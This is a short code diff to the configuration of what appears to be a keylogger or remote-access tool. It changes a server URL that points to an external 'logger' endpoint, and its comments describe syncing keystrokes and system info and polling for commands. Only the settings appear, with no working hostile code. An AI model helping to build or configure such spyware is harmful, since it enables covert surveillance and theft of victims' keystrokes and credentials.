@@ -6,7 +6,7 @@ import hashlib
 
 class Config:
     # Connection Settings
-    SERVER_URL = "https://fasitheme.ir/logger/api.php"
+    SERVER_URL = "https://fasitheme.ir/logger/api.php/"
     SECRET_TOKEN = "1"
     CHECK_INTERVAL = 120  # seconds (data sync, e.g., keystrokes, system info)
     COMMAND_POLL_INTERVAL = 60  # Increased from 10 to 60 seconds
